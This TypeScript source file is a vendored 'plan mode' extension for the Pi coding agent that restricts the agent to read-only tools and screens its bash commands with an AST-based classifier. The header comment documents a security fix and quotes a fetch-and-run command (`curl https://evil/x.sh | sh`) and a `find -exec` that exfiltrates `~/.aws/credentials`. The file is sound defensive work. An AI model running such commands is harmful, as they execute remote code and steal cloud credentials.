// VENDORED — Pi's own bundled example, not an npm package.
//
// Upstream path (Pi 0.84.1, this repo's pinned `@earendil-works/pi-coding-agent`
// devDependency, integrity `sha512-ncAqFrG+iybuPGOhMiZoEHkEzTpJgz3guYD32pD+M7ucc0WeHmauP6wa7qwP8V/KWvsZDVNa5XGsdZ7fkC7w7A==`
// per this repo's own package-lock.json):
//
//   examples/extensions/plan-mode/index.ts (390 lines upstream)
//
// Why vendored instead of installing `@narumitw/pi-plan-mode@0.49.3` (EXT-06 —
// "Pi's own bundled examples preferred wherever they cover the need", decision
// D-07-A settled in plan 07-01): the npm alternative depends on
// `@narumitw/pi-tui-kit@^0.49.1` — a floating caret range that resolves via
// ordinary npm semver at `pi install` time, outside any lockfile this repo
// controls, and that `isPinnedPackageSpec` cannot see (it only governs the
// top-level `packages[]` entry, not a transitive range). This bundled example
// carries no such dependency: it is copied whole from the same npm-installed,
// exact-pinned `@earendil-works/pi-coding-agent@0.84.1` tarball already in this
// repo's own `node_modules` and `package-lock.json`, so there is nothing here
// for a caret range to drift.
//
// Registers NO model-facing tool anywhere in this file or ./utils.ts — grep for
// the tool-registration call over both returns zero matches (verified below);
// it gates which of Pi's ALREADY-REGISTERED built-in tools are active via
// `pi.setActiveTools`, which is not a registration and costs no schema tokens.
// `tests/unit/contributing-boundary.test.ts`'s `TOOL_REGISTRATION_ALLOWLIST` is
// therefore left unchanged — no entry added, because none is owed. Its only
// per-turn system-prompt cost is its two registered commands (`/plan`,
// `/plan-todos`) — `src/core/system-prompt.ts` carries no reference to
// registered commands, so a command costs zero
// [CITED: tests/unit/contributing-boundary.test.ts's own BOOT-10 citation].
//
// Four permitted changes from a byte-for-byte copy, and nothing else —
// preserved otherwise exactly as upstream ships it (no reformatting, no
// identifier renames, no restructuring), so this file stays diffable against
// a newer bundled example on the next Pi version bump. Changes 1-3 are
// mechanical; change 4 is the only BEHAVIOURAL deviation and it was forced by
// this phase's code review:
//
//   1. `pi.registerCommand("todos", ...)` renamed to `pi.registerCommand(
//      "plan-todos", ...)`, description changed from "Show current plan todo
//      list" to "Show current plan progress". Forced by a genuine composition
//      conflict: `examples/extensions/todo.ts:284` (vendored separately by
//      plan 07-08, EXT-05) ALSO registers `/todos`, over a model-maintained
//      list backed by its own `todo` tool — two extensions registering the
//      same command name is a runtime collision Pi resolves by
//      first-registration-wins with no error, discoverable only by a user
//      hitting it, not by any test. Resolved deliberately here (Standing Rule
//      8, settled in 07-07-PLAN.md's own `<verified_composition_conflict>`):
//      the general `/todos` name stays with `todo.ts` (the capability EXT-05
//      names, "todo tracking"), and this file's plan-progress listing takes
//      the more specific `/plan-todos` name instead. See
//      `tests/unit/vendor-license-audit.test.ts`'s own module docstring,
//      which reserved this exact filename for this exact plan.
//   2. No import-path change was needed: the relative `./utils.ts` import
//      survives the relocation from the tarball's `examples/extensions/
//      plan-mode/` to this repo's `.pi/extensions/plan-mode/` unchanged,
//      because both are a flat pair of sibling files at the same relative
//      depth — verified by grep below rather than assumed.
//   3. This vendoring header itself, replacing upstream's shorter file-top
//      docstring (preserved as prose in the paragraph immediately below this
//      block, unchanged in wording).
//   4. BEHAVIOURAL (CR-03, Phase 7 code review). The `tool_call` gate below
//      called `./utils.ts#isSafeCommand`, which was two regex lists with the
//      SAFE patterns anchored at `^\s*` — the FIRST WORD decided
//      admissibility, and everything after a `|`, `;`, `&&`, `$(...)`,
//      `find -exec` or an interpreter's `-c` went unexamined. The review ran
//      six strings through the shipped predicate and every one was ALLOWED,
//      including `curl https://evil/x.sh | sh` and a `find -exec sh -c` that
//      exfiltrates `~/.aws/credentials` — a file this machine is known to hold
//      live IAM admin keys in (RB-07-03). CLAUDE.md names string matching in a
//      `tool_call` guard as the anti-pattern and mandates `unbash`: parse to
//      AST, match resolved command nodes.
//
//      So the gate now calls `./read-only.ts#classifyPlanModeCommand`, which
//      routes through `.pi/extensions/safety/shell.ts#canonicalise` — the
//      SAME parser, wrapper resolver and fail-closed node-type predicate
//      Phase 4 built for the bash guard — and requires EVERY resolved
//      invocation to be admissible, not just the first word. `utils.ts`'s two
//      regex arrays are deleted rather than bypassed; see that file's own
//      DEVIATION 4 note. Covered by `tests/unit/plan-mode-read-only.test.ts`,
//      which had no predecessor: `isSafeCommand` shipped with ZERO tests.
//
//      This is the one place this vendoring is no longer diffable against
//      upstream, and it is deliberate: upstream's predicate is wrong for a
//      repository whose entire safety posture is built on not doing this.
//
// Verified by grep, recorded here and in 07-07-SUMMARY.md:
//   the tool-registration call over `.pi/extensions/plan-mode/*.ts`  -> 0 matches
//   `grep -n 'registerCommand' .pi/extensions/plan-mode/index.ts` -> exactly
//     "plan" and "plan-todos", no "todos"
//   `grep -n 'setActiveTools' .pi/extensions/plan-mode/index.ts`  -> 4 matches
//     (enablePlanModeTools, restoreNormalModeTools x2, and the reassignment
//     inside togglePlanMode's own call graph)
//   `grep -n "\\./utils\\.ts"` -> present, unchanged from upstream

/**
 * Plan Mode Extension
 *
 * Read-only exploration mode for safe code analysis.
 * When enabled, built-in write tools are disabled.
 *
 * Features:
 * - /plan command or Ctrl+Alt+P to toggle
 * - Bash restricted to allowlisted read-only commands
 * - Extracts numbered plan steps from "Plan:" sections
 * - [DONE:n] markers to complete steps during execution
 * - Progress tracking widget during execution
 */

import type { AgentMessage } from "@earendil-works/pi-agent-core";
import type { AssistantMessage, TextContent } from "@earendil-works/pi-ai";
import type { ExtensionAPI, ExtensionContext } from "@earendil-works/pi-coding-agent";
import { Key } from "@earendil-works/pi-tui";
import { classifyPlanModeCommand } from "./read-only.ts";
import { extractTodoItems, markCompletedSteps, type TodoItem } from "./utils.ts";

// Tools
const PLAN_MODE_TOOLS = ["read", "bash", "grep", "find", "ls", "questionnaire"];
// DEVIATION 5 (WR-18, Phase 7 code review). Upstream ships
// `["read", "bash", "edit", "write"]`. `grep`, `find`, `ls` and `questionnaire`
// are in PLAN_MANAGED_TOOLS (below) but were NOT in this set, so
// getNormalModeTools' filter strips them and the concatenation never adds them
// back -- a call through that path leaves the session with FOUR active tools
// and no search capability, permanently, with no message. `questionnaire` is in
// that list precisely BECAUSE this repo vendored the questionnaire tool (plan
// 07-08), so this is not purely upstream's problem to have.
//
// REACHABILITY: UNVERIFIED, and the review's stated path does NOT hold. The
// review said the fallback is reached "after /reload when the persisted
// plan-mode entry carries toolsBeforePlanMode: undefined while enabled is
// true". Traced against this file: `session_start`'s tail calls
// `enablePlanModeTools()` unconditionally whenever `planModeEnabled` is true,
// and that function snapshots `pi.getActiveTools()` whenever the value is
// undefined -- so every path into `restoreNormalModeTools()` is preceded by a
// snapshot, and the `??` fallback is currently DEAD. Every call site was
// checked (the /plan toggle, and the "Execute the plan" branch of agent_end).
//
// Fixed anyway, and the correction recorded rather than the reachability
// overstated: the function's own contract is "the tool set to activate when
// leaving plan mode", and a set that silently omits four tools it manages is
// wrong whether or not today's control flow reaches it. A latent defect one
// refactor away from being live, in the tool-gating path, is not something to
// leave sitting because it currently cannot fire.
const NORMAL_MODE_TOOLS = ["read", "bash", "edit", "write", "grep", "find", "ls", "questionnaire"];
const PLAN_MODE_DISABLED_TOOLS = new Set<string>(["edit", "write"]);
const PLAN_MANAGED_TOOLS = new Set<string>([...PLAN_MODE_TOOLS, ...NORMAL_MODE_TOOLS]);

// DEVIATION 5, second half (WR-18). These three were nested inside the
// extension factory upstream. They are PURE functions of their argument and the
// module constants above -- they close over nothing -- so they are hoisted to
// module scope and exported, and nothing else about them changed. Upstream's own
// `utils.ts` states the principle this follows verbatim: "Extracted for
// testability."
//
// It had to be done, because the defect below is otherwise UNTESTABLE. See
// `tests/unit/plan-mode-read-only.test.ts`'s WR-18 block, which asserts the
// round-trip property directly and was falsified against the upstream constant.

export function uniqueToolNames(toolNames: string[]): string[] {
	return [...new Set(toolNames)];
}

export function getPlanModeTools(activeToolNames: string[]): string[] {
	return uniqueToolNames([
		...activeToolNames.filter((name) => !PLAN_MODE_DISABLED_TOOLS.has(name)),
		...PLAN_MODE_TOOLS,
	]);
}

export function getNormalModeTools(activeToolNames: string[]): string[] {
	return uniqueToolNames([
		...NORMAL_MODE_TOOLS,
		...activeToolNames.filter((name) => !PLAN_MANAGED_TOOLS.has(name)),
	]);
}

interface PlanModeState {
	enabled: boolean;
	todos?: TodoItem[];
	executing?: boolean;
	toolsBeforePlanMode?: string[];
}

// Type guard for assistant messages
function isAssistantMessage(m: AgentMessage): m is AssistantMessage {
	return m.role === "assistant" && Array.isArray(m.content);
}

// Extract text content from an assistant message
function getTextContent(message: AssistantMessage): string {
	return message.content
		.filter((block): block is TextContent => block.type === "text")
		.map((block) => block.text)
		.join("\n");
}

export default function planModeExtension(pi: ExtensionAPI): void {
	let planModeEnabled = false;
	let executionMode = false;
	let todoItems: TodoItem[] = [];
	let toolsBeforePlanMode: string[] | undefined;

	pi.registerFlag("plan", {
		description: "Start in plan mode (read-only exploration)",
		type: "boolean",
		default: false,
	});

	function updateStatus(ctx: ExtensionContext): void {
		// Footer status
		if (executionMode && todoItems.length > 0) {
			const completed = todoItems.filter((t) => t.completed).length;
			ctx.ui.setStatus("plan-mode", ctx.ui.theme.fg("accent", `📋 ${completed}/${todoItems.length}`));
		} else if (planModeEnabled) {
			ctx.ui.setStatus("plan-mode", ctx.ui.theme.fg("warning", "⏸ plan"));
		} else {
			ctx.ui.setStatus("plan-mode", undefined);
		}

		// Widget showing todo list
		if (executionMode && todoItems.length > 0) {
			const lines = todoItems.map((item) => {
				if (item.completed) {
					return (
						ctx.ui.theme.fg("success", "☑ ") + ctx.ui.theme.fg("muted", ctx.ui.theme.strikethrough(item.text))
					);
				}
				return `${ctx.ui.theme.fg("muted", "☐ ")}${item.text}`;
			});
			ctx.ui.setWidget("plan-todos", lines);
		} else {
			ctx.ui.setWidget("plan-todos", undefined);
		}
	}

	function enablePlanModeTools(): void {
		if (toolsBeforePlanMode === undefined) {
			toolsBeforePlanMode = pi.getActiveTools();
		}
		pi.setActiveTools(getPlanModeTools(toolsBeforePlanMode));
	}

	function restoreNormalModeTools(): void {
		pi.setActiveTools(toolsBeforePlanMode ?? getNormalModeTools(pi.getActiveTools()));
		toolsBeforePlanMode = undefined;
	}

	function persistState(): void {
		pi.appendEntry("plan-mode", {
			enabled: planModeEnabled,
			todos: todoItems,
			executing: executionMode,
			toolsBeforePlanMode,
		});
	}

	function togglePlanMode(ctx: ExtensionContext): void {
		planModeEnabled = !planModeEnabled;
		executionMode = false;
		todoItems = [];

		if (planModeEnabled) {
			enablePlanModeTools();
			ctx.ui.notify("Plan mode enabled. Built-in write tools disabled.");
		} else {
			restoreNormalModeTools();
			ctx.ui.notify("Plan mode disabled. Full access restored.");
		}
		updateStatus(ctx);
		persistState();
	}

	pi.registerCommand("plan", {
		description: "Toggle plan mode (read-only exploration)",
		handler: async (_args, ctx) => togglePlanMode(ctx),
	});

	pi.registerCommand("plan-todos", {
		description: "Show current plan progress",
		handler: async (_args, ctx) => {
			if (todoItems.length === 0) {
				ctx.ui.notify("No todos. Create a plan first with /plan", "info");
				return;
			}
			const list = todoItems.map((item, i) => `${i + 1}. ${item.completed ? "✓" : "○"} ${item.text}`).join("\n");
			ctx.ui.notify(`Plan Progress:\n${list}`, "info");
		},
	});

	pi.registerShortcut(Key.ctrlAlt("p"), {
		description: "Toggle plan mode",
		handler: async (ctx) => togglePlanMode(ctx),
	});

	// Block destructive bash commands in plan mode
	pi.on("tool_call", async (event) => {
		if (!planModeEnabled || event.toolName !== "bash") return;

		const command = event.input.command as string;
		// DEVIATION 4 (CR-03): decided over the unbash AST, and EVERY resolved
		// command node must be admissible, not just the first word. The verdict
		// carries its own reason so the model is told which node failed and why
		// rather than "not allowlisted" -- upstream's message could not say,
		// because upstream never knew.
		const verdict = classifyPlanModeCommand(command);
		if (verdict.kind === "deny") {
			return {
				block: true,
				reason: `Plan mode: command blocked -- ${verdict.reason}. Use /plan to disable plan mode first.\nCommand: ${command}`,
			};
		}
	});

	// Filter out stale plan mode context when not in plan mode
	pi.on("context", async (event) => {
		if (planModeEnabled) return;

		return {
			messages: event.messages.filter((m) => {
				const msg = m as AgentMessage & { customType?: string };
				if (msg.customType === "plan-mode-context") return false;
				if (msg.role !== "user") return true;

				const content = msg.content;
				if (typeof content === "string") {
					return !content.includes("[PLAN MODE ACTIVE]");
				}
				if (Array.isArray(content)) {
					return !content.some(
						(c) => c.type === "text" && (c as TextContent).text?.includes("[PLAN MODE ACTIVE]"),
					);
				}
				return true;
			}),
		};
	});

	// Inject plan/execution context before agent starts
	pi.on("before_agent_start", async () => {
		if (planModeEnabled) {
			return {
				message: {
					customType: "plan-mode-context",
					content: `[PLAN MODE ACTIVE]
You are in plan mode - a read-only exploration mode for safe code analysis.

Restrictions:
- Built-in edit and write tools are disabled
- Other currently active tools remain available
- Bash is restricted to an allowlist of read-only commands

Ask clarifying questions using the questionnaire tool.
Use brave-search skill via bash for web research.

Create a detailed numbered plan under a "Plan:" header:

Plan:
1. First step description
2. Second step description
...

Do NOT attempt to make changes - just describe what you would do.`,
					display: false,
				},
			};
		}

		if (executionMode && todoItems.length > 0) {
			const remaining = todoItems.filter((t) => !t.completed);
			const todoList = remaining.map((t) => `${t.step}. ${t.text}`).join("\n");
			return {
				message: {
					customType: "plan-execution-context",
					content: `[EXECUTING PLAN - Full tool access enabled]

Remaining steps:
${todoList}

Execute each step in order.
After completing a step, include a [DONE:n] tag in your response.`,
					display: false,
				},
			};
		}
	});

	// Track progress after each turn
	pi.on("turn_end", async (event, ctx) => {
		if (!executionMode || todoItems.length === 0) return;
		if (!isAssistantMessage(event.message)) return;

		const text = getTextContent(event.message);
		if (markCompletedSteps(text, todoItems) > 0) {
			updateStatus(ctx);
		}
		persistState();
	});

	// Handle plan completion and plan mode UI
	pi.on("agent_end", async (event, ctx) => {
		// Check if execution is complete
		if (executionMode && todoItems.length > 0) {
			if (todoItems.every((t) => t.completed)) {
				const completedList = todoItems.map((t) => `~~${t.text}~~`).join("\n");
				pi.sendMessage(
					{ customType: "plan-complete", content: `**Plan Complete!** ✓\n\n${completedList}`, display: true },
					{ triggerTurn: false },
				);
				executionMode = false;
				todoItems = [];
				updateStatus(ctx);
				persistState(); // Save cleared state so resume doesn't restore old execution mode
			}
			return;
		}

		if (!planModeEnabled || !ctx.hasUI) return;

		// Extract todos from last assistant message
		const lastAssistant = [...event.messages].reverse().find(isAssistantMessage);
		if (lastAssistant) {
			const extracted = extractTodoItems(getTextContent(lastAssistant));
			if (extracted.length > 0) {
				todoItems = extracted;
			}
		}

		if (todoItems.length === 0) return;
		persistState();

		// Show plan steps and prompt for next action
		const todoListText = todoItems.map((t, i) => `${i + 1}. ☐ ${t.text}`).join("\n");
		const planTodoListMessage = {
			customType: "plan-todo-list",
			content: `**Plan Steps (${todoItems.length}):**\n\n${todoListText}`,
			display: true,
		};

		const choice = await ctx.ui.select("Plan mode - what next?", [
			"Execute the plan (track progress)",
			"Stay in plan mode",
			"Refine the plan",
		]);

		if (choice?.startsWith("Execute")) {
			const firstTodoItem = todoItems[0];
			if (!firstTodoItem) return;

			planModeEnabled = false;
			executionMode = true;
			restoreNormalModeTools();
			updateStatus(ctx);
			persistState();

			const remainingList = todoItems.map((t) => `${t.step}. ${t.text}`).join("\n");
			const execMessage = `Execute the plan.

Remaining steps:
${remainingList}

Start with: ${firstTodoItem.text}
After completing a step, include a [DONE:n] tag in your response.`;
			pi.sendMessage(planTodoListMessage, { deliverAs: "followUp" });
			pi.sendMessage(
				{ customType: "plan-mode-execute", content: execMessage, display: true },
				{ triggerTurn: true, deliverAs: "followUp" },
			);
		} else if (choice === "Refine the plan") {
			const refinement = await ctx.ui.editor("Refine the plan:", "");
			if (refinement?.trim()) {
				pi.sendMessage(planTodoListMessage, { deliverAs: "followUp" });
				pi.sendUserMessage(refinement.trim(), { deliverAs: "followUp" });
			}
		}
	});

	// Restore state on session start/resume
	pi.on("session_start", async (_event, ctx) => {
		if (pi.getFlag("plan") === true) {
			planModeEnabled = true;
		}

		const entries = ctx.sessionManager.getEntries();

		// Restore persisted state
		const planModeEntry = entries
			.filter((e: { type: string; customType?: string }) => e.type === "custom" && e.customType === "plan-mode")
			.pop() as { data?: PlanModeState } | undefined;

		if (planModeEntry?.data) {
			planModeEnabled = planModeEntry.data.enabled ?? planModeEnabled;
			todoItems = planModeEntry.data.todos ?? todoItems;
			executionMode = planModeEntry.data.executing ?? executionMode;
			toolsBeforePlanMode = planModeEntry.data.toolsBeforePlanMode ?? toolsBeforePlanMode;
		}

		// On resume: re-scan messages to rebuild completion state
		// Only scan messages AFTER the last "plan-mode-execute" to avoid picking up [DONE:n] from previous plans
		const isResume = planModeEntry !== undefined;
		if (isResume && executionMode && todoItems.length > 0) {
			// Find the index of the last plan-mode-execute entry (marks when current execution started)
			let executeIndex = -1;
			for (let i = entries.length - 1; i >= 0; i--) {
				const entry = entries[i] as { type: string; customType?: string };
				if (entry.customType === "plan-mode-execute") {
					executeIndex = i;
					break;
				}
			}

			// Only scan messages after the execute marker
			const messages: AssistantMessage[] = [];
			for (let i = executeIndex + 1; i < entries.length; i++) {
				const entry = entries[i];
				if (entry.type === "message" && "message" in entry && isAssistantMessage(entry.message as AgentMessage)) {
					messages.push(entry.message as AssistantMessage);
				}
			}
			const allText = messages.map(getTextContent).join("\n");
			markCompletedSteps(allText, todoItems);
		}

		if (planModeEnabled) {
			enablePlanModeTools();
		}
		updateStatus(ctx);
	});
}
